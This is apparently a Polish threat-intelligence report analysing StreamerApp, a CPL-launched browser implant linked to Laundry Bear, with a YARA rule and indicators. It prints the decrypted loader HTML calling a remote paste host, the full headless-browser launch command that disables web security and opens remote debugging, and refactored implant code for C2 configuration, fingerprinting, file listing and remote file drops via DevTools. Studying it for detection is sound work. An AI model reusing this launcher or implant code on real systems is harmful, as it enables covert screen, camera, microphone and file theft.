---
reportId: streamerapp-laundry-bear-browser-implant
lang: pl
title: "Kiedy przeglądarka staje się implantem: StreamerApp - nowe narzędzie w arsenale Laundry Bear"
description: "Analiza wariantu StreamerApp, w którym aplet CPL uruchamia przeglądarkowy implant wykorzystujący Chromium, WebSocket i Chrome DevTools Protocol."
date: 2026-03-15
draft: false
tlp: clear
tags:
  - laundry bear
  - void blizzard
  - streamerapp
  - cpl
  - chromium
  - websocket
  - cdp
  - browser implant
yaraRules:
  - name: "streamerapp_browser_implant_delivery"
    description: "Reguła wykrywająca artefakty związane z launcherem CPL i przeglądarkowym implantem StreamerApp."
    source: |
      rule streamerapp_browser_implant_delivery {
        meta:
          author = "irondefence"
          description = "Detects StreamerApp browser implant delivery and execution artifacts"
          date = "2026-03-15"
          tlp = "clear"

        strings:
          $pastefy = "pastefy.app/B9LUfqZh/raw" ascii wide
          $lnkua = "lnk.ua/lZRJggrBK" ascii wide
          $debug = "http://127.0.0.1:9222/json/version" ascii wide
          $edge = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe" ascii wide
          $headless = "--headless=new" ascii wide
          $ws = "webSocketDebuggerUrl" ascii wide
          $download = "Browser.setDownloadBehavior" ascii wide
          $target = "Target.attachToTarget" ascii wide

        condition:
          4 of them
      }
---

# Kiedy przeglądarka staje się implantem: StreamerApp - nowe narzędzie w arsenale Laundry Bear

![](https://miro.medium.com/v2/resize:fit:875/1*86dpd_mOZUUXAcHUNobM2w.png)

Na pierwszy rzut oka ta próbka nie wygląda jak szczególnie ambitny backdoor. Nie ma tu wielkiego natywnego beacona, nie ma od razu oczywistej persystencji, nie ma też klasycznego schematu: „dropper zapisuje EXE, odpala payload i kończy robotę”.

**Zamiast tego robi coś znacznie ciekawszego.**

W analizowanym wariancie punkt wejścia infekcji stanowi plik `.cpl`, czyli aplet Panelu sterowania systemu Windows. Technicznie rzecz biorąc, CPL jest biblioteką DLL ładowaną przez `control.exe`. Nieoczywiste rozszerzenie daje atakującemu wiarygodny i mało rzucający się w oczy launcher dla dalszych etapów infekcji, a także może zwiększać jego skuteczność jako ładunku phishingowego.

![](https://miro.medium.com/v2/resize:fit:875/1*Z-tv1Y4hVL6zjd2_EE6PZQ.png)

W tym przypadku sam CPL nie jest właściwym implantem. Jego zadaniem jest przygotowanie środowiska i uruchomienie kolejnego, „przeglądarkowego” etapu zakażenia.

![](https://miro.medium.com/v2/resize:fit:875/1*0_4cY5M5noR8t7no_74MKg.png)

*Full chain process creation flow*

## Od apletu Panelu sterowania do browser-based implant

Jak wcześniej wspomniano, CPL jest odpowiedzialny za zainicjowanie procesu zakażenia. Tworzy on lokalny plik `.htm` w katalogu tymczasowym. Następnie sprawdza, czy w systemie znajduje się Microsoft Edge. Jeżeli nie, przełącza się na Chrome. Potem składa finalną komendę uruchomieniową i wykonuje ją przez `WinExec`.

![](https://miro.medium.com/v2/resize:fit:875/1*nGiJuqoVEHxzrdPHY_FBDQ.png)

*Binary flow*

W tym miejscu warto podkreślić, że kluczowe artefakty, takie jak ścieżki, parametry uruchomieniowe oraz payload zapisywany do pliku `.htm`, są przechowywane w postaci zaszyfrowanych bloków danych, które podczas wykonania są kopiowane do bufora tymczasowego, a następnie odszyfrowywane prostym XOR-em z cyklicznym kluczem 8-bajtowym. Mechanizm nie jest kryptograficznie złożony, ale skutecznie ukrywa najważniejsze artefakty przed prostą analizą statyczną.  
Plik `.htm` tworzony jest w `%TEMP%` pod losową nazwą złożoną z dwunastu znaków alfanumerycznych. Poniżej zaprezentowano zawartość w nim umieszczoną, która jest odzyskiwana z zaszyfrowanego bloku danych:

```html
<script>document.write(String.fromCharCode(0x3c,0x21,0x44, ... 0x3e,0xa));</script>
```

Po rozwinięciu `String.fromCharCode(...)` otrzymujemy właściwą treść lokalnego pliku:

```html
<!DOCTYPE html>
<body>
 <script src="https[://]pastefy[.]app/B9LUfqZh/raw"></script>
</body>
</html>
```

### Wybór Edge i fallback do Chrome

Launcher nie uruchamia przeglądarki w sposób przypadkowy. Jednym z odszyfrowanych stringów jest ścieżka rejestru:  
`SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\ msedge.exe`

Jest ona sprawdzana w `HKCU` i `HKLM`, odczytuje domyślną wartość, normalizuje ścieżkę i weryfikuje obecność wskazanego pliku. Jeżeli `msedge.exe` istnieje, przechodzi do budowy komendy uruchomienia dla Edge, a w przeciwnym razie buduje komendę dla Chrome.

### Budowa komendy i znaczenie parametrów uruchomieniowych

Właściwy charakter próbki ujawnia się dopiero po odszyfrowaniu stringów budujących finalną komendę — poprzez połączenie prefiksu, ścieżki do pliku `.htm` i suffixu z komendą do uruchomienia lure.

Edge:

```bat
cmd /c start msedge --headless=new --user-data-dir="%TEMP%\XE"
--auto-select-screen-capture-source=true --use-fake-ui-for-media-stream
--no-sandbox --disable-user-media-security --disable-web-security
--remote-debugging-port=9222 -remote-allow-origins=*
--allow-file-access-from-files "%TEMP%\<[A-Za-z0-9]{12}>.htm"
&& start https[://]lnk[.]ua/lZRJggrBK
```

Chrome:

```bat
cmd /c start chrome --headless=new --user-data-dir="%TEMP%\XC"
--auto-select-screen-capture-source=true --use-fake-ui-for-media-stream
--no-sandbox --disable-user-media-security --disable-web-security
--remote-debugging-port=9222 -remote-allow-origins=*
--allow-file-access-from-files "%TEMP%\<[A-Za-z0-9]{12}>.htm"
&& start https[://]lnk[.]ua/lZRJggrBK
```

Właściwie dobrane parametry umożliwiają atakującemu uzyskanie pokaźnych możliwości:

- `--headless=new` uruchamia browser bez klasycznego interfejsu;
- `--user-data-dir` wymusza odrębny profil w `%TEMP%`, dzięki czemu cała aktywność odbywa się poza normalnym profilem użytkownika;
- `--remote-debugging-port=9222` aktywuje Chrome DevTools Protocol, który później okazuje się istotnym elementem post-exploitation;

Najważniejsze są jednak flagi osłabiające bezpieczeństwo:

- `--allow-file-access-from-files` pozwala skryptowi uruchomionemu z lokalnego pliku `file://` odwoływać się do innych lokalnych zasobów;
- `--disable-web-security` ogranicza ochrony same-origin i część restrykcji cross-origin;
- `--disable-user-media-security` osłabia zabezpieczenia wokół interfejsów mediów użytkownika, czyli przede wszystkim kamery i mikrofonu;
- `--use-fake-ui-for-media-stream` automatyzuje akceptację żądań dostępu do kamery i mikrofonu;
- `--auto-select-screen-capture-source=true` eliminuje potrzebę ręcznego wyboru źródła przechwytywania ekranu.

![](https://miro.medium.com/v2/resize:fit:875/1*9rqFThPyDkBUE7R62haw4g.png)

### Potem przeglądarka przestaje zachowywać się jak przeglądarka

Poprzez załadowanie tworzonego pliku `.htm` pobierany jest ze zdalnej lokalizacji właściwy JavaScript, zaciemniony warstwą obfuskacji. To on pełni funkcję złośliwego implantu i daje możliwość komunikacji z serwerem C2 z wykorzystaniem WebSocket, przechwytywania obrazu i dźwięku oraz odczytu i transferu plików.

### Dalsza część analizy został zrealizowana na podstawie kodu po refaktoryzacji, w zakresie nazewnctwa zmiennych.

```js
async start() {
    const wsUrl = await Utils.getWebSocketUrl();
    this.#ws = new WebSocketManager(wsUrl);
    this.#ws.onClose = () => this.#reconnect();
    this.#screen = new ScreenStreamer(this.#ws);
    this.#camera = new Camera(this.#ws);
    this.#mic = new Microphone(this.#ws);
    this.#files = new FileManager(this.#ws);
    this.#setupHandlers();
    const [fingerprint, country] = await Promise.all([Utils.generateFingerprint(), Promise.resolve(Utils.detectCountry())]);
    await this.#ws.connect();
    this.#ws.send({ type: 'register', id: fingerprint, country });
    await this.#screen.start();
}

#reconnect() {
    this.#camera?.stop();
    this.#mic?.stop();
    setTimeout(() => this.start(), 3000);
}
```

Podczas uruchomienia próbka w pierwszej kolejności pobiera właściwy adres C2, z którym następnie ma zostać ustanowione połączenie WebSocket.

```js
const CONFIG_URL = 'https://pastefy.app/8gkXtCq0/raw';

async getWebSocketUrl() {
    try {
        const url = (await (await fetch(CONFIG_URL)).text()).trim().replace(/\/$/, '');
        return url.endsWith('/ws') ? url : url + '/ws';
    } catch {
        return 'ws://127.0.0.1:6341/ws';
    }
}
```

Następnie inicjalizowane są wszystkie komponenty funkcjonalne, po czym generowany jest fingerprint ofiary oraz określany jest kod kraju.

```js
generateFingerprint() {
    const stored = localStorage.getItem(STORAGE_KEY);
    if (stored) return stored;
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    Object.assign(ctx, { textBaseline: 'top', font: '14px Arial', fillStyle: '#f60' });
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Hello, world!', 2, 15);
    const rawHash = [
        canvas.toDataURL(),
        screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
        navigator.userAgent,
        navigator.language,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency ?? 'unknown',
        navigator.platform
    ].join('|').split('').reduce((acc, ch) => (acc << 5) - acc + ch.charCodeAt(0) | 0, 0);
    const fingerprint = Math.abs(rawHash).toString(36).padStart(8, '0').slice(0, 8);
    localStorage.setItem(STORAGE_KEY, fingerprint);
    return fingerprint;
},

detectCountry: () => TIMEZONE_MAP[Intl.DateTimeFormat().resolvedOptions().timeZone] ?? 'US',
```

Realizowane jest to za pomocą funkcji `generateFingerprint()` oraz `detectCountry()`. Pierwsza z nich najpierw próbuje odczytać wartość z `localStorage` spod klucza `STORAGE_KEY`. Jeżeli wartość już istnieje, zostaje natychmiast zwrócona. W przeciwnym wypadku funkcja przechodzi do generowania fingerprintu ofiary na podstawie cech przeglądarki i urządzenia. W tym celu wykorzystywany jest odcisk canvas oraz zestaw cech środowiskowych obejmujący rozdzielczość i głębię kolorów ekranu, `userAgent`, język przeglądarki, offset strefy czasowej, liczbę logicznych rdzeni CPU oraz platformę systemową. Zebrane wartości są łączone w jeden łańcuch znaków, a następnie redukowane do 32-bitowego hasha za pomocą prostego deterministycznego algorytmu. Otrzymany wynik zostaje przekształcony do postaci 8-znakowego identyfikatora w formacie base36 i zapisany w `localStorage`, co umożliwia ponowne rozpoznanie tego samego klienta w kolejnych sesjach.

Druga funkcja, `detectCountry()`, określa kod kraju na podstawie strefy czasowej ustawionej w systemie. Wartości te pobierane są ze zdefiniowanej wcześniej mapy stref czasowych do kodów państw, a w przypadku braku dopasowania ustawiana jest wartość domyślna `US`.

Po wykonaniu tych operacji dochodzi do ustanowienia połączenia z serwerem C2, a następnie przesyłana jest wiadomość `register`, zawierająca zgromadzone artefakty identyfikujące klienta, i zostaje uruchomiony streaming ekranu.

### Wykorzystywane polecenia C2

- `quality` — zmiana jakości streamu ekranu,
- `quality_camera` — zmiana jakości streamu kamery,
- `camera_start` — inicjalizacja kamery,
- `camera_resume` — wznowienie kamery,
- `camera_pause` — wstrzymanie kamery,
- `camera_stop` — zatrzymanie kamery,
- `mic_start` — uruchomienie mikrofonu,
- `mic_stop` — zatrzymanie mikrofonu,
- `mic_noise_suppression` — zmiana redukcji szumu,
- `file_list_request` — listowanie katalogu,
- `file_download` — odczyt i wysyłka pliku,
- `file_upload` — zapis pliku na hoście,
- `file_scan_recursive` — rekursywne skanowanie plików,
- `archive_download` — zbiorczy transfer plików,
- `heartbeat_ack` — odpowiedź na komunikat heartbeat.

### Wykorzystywane typy komunikatów wysyłanych przez klienta

- `register` — rejestracja klienta,
- `heartbeat` — sygnał podtrzymania połączenia,
- `frame` — klatka ekranu,
- `frame_camera` — klatka z kamery,
- `camera_error` — błąd kamery,
- `file_list` — wynik listowania katalogu,
- `file_data` — cały plik w jednej wiadomości,
- `file_chunk` — fragment pliku,
- `file_complete` — zakończenie transferu pliku,
- `file_upload_success` — rozpoczęcie zapisu pliku,
- `file_error` — błąd operacji plikowej,
- `scan_progress` — postęp skanowania rekursywnego katalogów,
- `scan_complete` — zakończenie skanowania rekursywnego katalogów,
- `archive_progress` — postęp transferu zbiorczego,
- `archive_file_skipped` — pominięty plik podczas transferu zbiorczego,
- `archive_download_complete` — zakończenie transferu zbiorczego,
- `audio_data` — próbki audio z mikrofonu,
- `mic_started` — uruchomienie mikrofonu,
- `mic_stopped` — zatrzymanie mikrofonu,
- `mic_error` — błąd mikrofonu.

### Liczy się wnętrze — ciekawe implementacje wybranych modułów.

#### Moduł przeglądania plików
Mechanizm przeglądania plików jest realizowany przez właściwy komponent we współpracy z klasą `IframeFileReader.loadDirectory()`.

```js
static loadDirectory(path, timeout = 3000) {
    return new Promise((resolve, reject) => {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        try {
            iframe.src = Utils.normalizeFilePath(path);
        } catch (err) {
            return reject(new Error('Invalid path: ' + err.message));
        }
        document.body.appendChild(iframe);
        const timer = setTimeout(() => {
            iframe.remove();
            reject(new Error('Access denied or timeout'));
        }, timeout);
        iframe.onload = () => {
            clearTimeout(timer);
            try {
                if (!iframe.contentDocument) {
                    iframe.remove();
                    return reject(new Error('Access denied'));
                }
                const files = IframeFileReader.parseDirectoryListing(iframe.contentDocument, path);
                iframe.remove();
                resolve(files);
            } catch (err) {
                iframe.remove();
                reject(new Error('Access denied: ' + err.message));
            }
        };
        iframe.onerror = () => {
            clearTimeout(timer);
            iframe.remove();
            reject(new Error('Access denied'));
        };
    });
}
```

Po otrzymaniu z serwera komendy `file_list_request` realizowana jest normalizacja ścieżki wejściowej do postaci URI `file:///`, a następnie osadzana jest ona w ukrytym elemencie `iframe`, dodawanym dynamicznie do dokumentu HTML. Po załadowaniu zawartości `iframe` próbka sprawdza, czy dostępny jest obiekt `contentDocument`. Jeżeli dostęp zostanie uzyskany, kod interpretuje widok katalogu jako dokument HTML i rozpoczyna jego parsowanie.

```js
static parseDirectoryListing(doc, dirPath) {
    return Array.from(doc.querySelectorAll('tr')).map(row => {
        const cells = row.querySelectorAll('td');
        if (cells.length < 3) return null;
        const link = cells[0].querySelector('a');
        if (!link) return null;
        const name = link.textContent.trim();
        if (['[Parent Directory]', '.', '..'].includes(name)) return null;
        return {
            name,
            path: dirPath.replace(/[\\/]+$/, '') + '/' + name,
            isDir: link.getAttribute('href').endsWith('/'),
            size: cells[2]?.textContent.trim() || '',
            date: cells[1]?.textContent.trim() || ''
        };
    }).filter(Boolean);
}
```

W praktyce wykonywane jest przeszukiwanie wierszy tabeli (`tr`), z których odczytywane są nazwy plików i katalogów, ich ścieżki, rozmiary oraz daty. Jednocześnie pomijane są wpisy techniczne, takie jak `[Parent Directory]`, `.` oraz `..`, aby wynik odpowiadał rzeczywistej zawartości katalogu.  
Tak uzyskane dane są następnie pakowane do struktury zawierającej m.in. nazwę, pełną ścieżkę, informację o tym, czy dany wpis jest katalogiem, rozmiar oraz datę, po czym odsyłane do serwera w komunikacie `file_list`.

#### Moduł “uploadFile”
Funkcja `uploadFile(url, path)` jest nazwana myląco, ponieważ w rzeczywistości nie realizuje uploadu pliku do serwera. Jej faktycznym celem jest pobranie wskazanego pliku z adresu zdalnego i zapisania go lokalnie na hoście ofiary we wskazanej lokalizacji. Funkcja ta jest wywoływana po otrzymaniu komendy `file_upload`, zawierającej adres URL pliku oraz ścieżkę docelową.

```js
async uploadFile(url, downloadPath) {
    try {
        const normalizedPath = downloadPath.replace(/\//g, '\\').replace(/\/+$/, '');
        const cdp = await CDPClient.connect();
        await cdp.send('Browser.setDownloadBehavior', { behavior: 'allow', downloadPath: normalizedPath, eventsEnabled: true });
        const { targetInfos } = await cdp.send('Target.getTargets');
        const pageTarget = targetInfos.find(tgt => tgt.type === 'page');
        if (!pageTarget) throw new Error('No page target found');
        const { sessionId } = await cdp.send('Target.attachToTarget', { targetId: pageTarget.targetId, flatten: true });
        await cdp.send('Runtime.enable', {}, sessionId);
        await cdp.send('Runtime.evaluate', {
            expression: `(function() {
                try {
                    var a = document.createElement('a');
                    a.href = '${url}';
                    a.download = '';
                    a.target = '_blank';
                    a.style.display = 'none';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    return 'OK';
                } catch (e) {
                    return 'ERR: ' + e.message;
                }
            })();`,
            returnByValue: true,
            awaitPromise: false
        }, sessionId);
        this.ws.send({ type: 'file_upload_success', message: 'File download started' });
    } catch (err) {
        this.#sendError('Upload failed: ' + err.message);
    }
}
```

W pierwszym kroku ścieżka docelowa jest normalizowana do formatu charakterystycznego dla systemu Windows. Następnie próbka nawiązuje połączenie z lokalnym interfejsem debugowym Chrome/Chromium, odwołując się do endpointu `http://127.0.0.1:9222/json/version` przy użyciu klasy `CDPClient`. Z odpowiedzi pobierany jest adres `webSocketDebuggerUrl`, który służy do zestawienia sesji z Chrome DevTools Protocol.

```js
static async connect(host = '127.0.0.1', port = 9222) {
    const response = await fetch('http://' + host + ':' + port + '/json/version');
    if (!response.ok) throw new Error('Cannot fetch /json/version: ' + response.status);
    const { webSocketDebuggerUrl } = await response.json();
    const socket = new WebSocket(webSocketDebuggerUrl);
    await new Promise((resolve, reject) => {
        socket.addEventListener('open', resolve, { once: true });
        socket.addEventListener('error', reject, { once: true });
    });
}
```

Po uzyskaniu połączenia wykonywane jest polecenie `Browser.setDownloadBehavior`, za pomocą którego ustawiany jest katalog pobierania wskazany w parametrze `path`. Następnie klient pobiera listę aktywnych targetów przeglądarki, wybiera target typu `page` i dołącza się do niego przy użyciu `Target.attachToTarget`. W dalszej kolejności włączany jest moduł `Runtime`, a do kontekstu strony wstrzykiwany jest kod JavaScript tworzący ukryty element `<a>`, ustawiający jego `href` na wskazany URL i wymuszający kliknięcie.  
Taki mechanizm powoduje, że przeglądarka inicjuje pobranie pliku i zapisuje go do wcześniej ustawionego katalogu lokalnego. Należy podkreślić, że wysyłany po tej operacji komunikat `file_upload_success` nie stanowi potwierdzenia faktycznego zakończenia pobierania ani poprawnego zapisu pliku, lecz jedynie informację o uruchomieniu procedury pobrania.

## Podsumowanie

Analizowany wariant CPL pełni rolę natywnego launchera, który przygotowuje środowisko dla właściwego, przeglądarkowego etapu infekcji. W praktyce tworzy on lokalny plik `.htm` w katalogu `%TEMP%`, odzyskuje z zaszyfrowanych bloków danych kluczowe stringi i payload HTML przy użyciu prostego mechanizmu XOR, sprawdza obecność Microsoft Edge przez właściwy klucz w rejestrze, a następnie uruchamia Edge lub Chrome z zestawem parametrów osłabiających standardowe mechanizmy bezpieczeństwa Chromium. Lokalny HTML jest loaderem pobierającym zdalny JavaScript, który przejmuje właściwą logikę działania i udostępnia operatorowi funkcje związane z przechwytywaniem ekranu, obrazu z kamery, dźwięku z mikrofonu, dostępem do lokalnych plików oraz możliwością dosyłania plików przez Chrome DevTools Protocol.

## Atrybucja

Analizując powyższą próbkę można zauważyć pewne istotne podobieństwa architektoniczne do malware PLUGGYAPE atrybuowanego przez [CERT-UA](https://cert.gov.ua/article/6286942) do UAC-0190 aka Laundry Bear / Void Blizzard.  
W obu przypadkach zaobserwowano m. in. wykorzystanie zewnętrznego źródła konfiguracji C2 i dostarczenia właściwego ładunku, mechanizmu trwałej identyfikacji ofiary, utrzymywania stałego kanału komunikacyjnego z serwerem. Jednocześnie próbki różnią się kontekstem wykonania, warstwą transportową oraz zakresem mechanizmów stealth i persystencji. Ponadto wziąć pod uwagę dodatkowe argumenty tj. podobieństwo lure opisane w artylule [LAB52](https://lab52.io/blog/drillapp-new-backdoor-targeting-ukrainian-entities-with-possible-links-to-laundry-bear/). Zwarzając na powyższe należy łączyć powyższą aktywność ze średnim prawdopodobieństwem do wspoknianego klastra.

| Obszar podobieństwa | Komentarz analityczny |
|---|---|
| Pozyskanie konfiguracji C2 | W obu przypadkach finalny adres serwera C2 nie jest osadzony jawnie w kodzie, lecz pobierany z zewnętrznych serwisów służących do przechowywania i udostępniania danych. |
| Pozyskanie właściwego ładunku | W obu przypadkach właściwy etap wykonywalny lub konfiguracyjny jest pobierany z infrastruktury pośredniej, a nie osadzony bezpośrednio jako jawny payload pierwszego etapu. |
| Identyfikacja ofiary | Obie próbki wykorzystują stabilny identyfikator klienta, który umożliwia rejestrację ofiary i korelację kolejnych sesji po stronie operatora. |
| Rejestracja klienta | Po zestawieniu połączenia obie próbki przekazują do serwera zestaw danych identyfikujących ofiarę lub środowisko wykonania. |
| Fallback do localhost | W obu przypadkach występuje mechanizm awaryjny odwołujący się do localhost, co może wskazywać na tryb testowy, środowisko developerskie. |
| Kanał komunikacyjny | Obie próbki wykorzystują trwały kanał komunikacyjny o charakterze sesyjnym, umożliwiający dwukierunkową wymianę poleceń i danych z serwerem operatora. |
| Mechanizm heartbeat | W obu implementacjach występuje mechanizm heartbeat, służący do podtrzymywania aktywnej sesji i monitorowania dostępności klienta. |
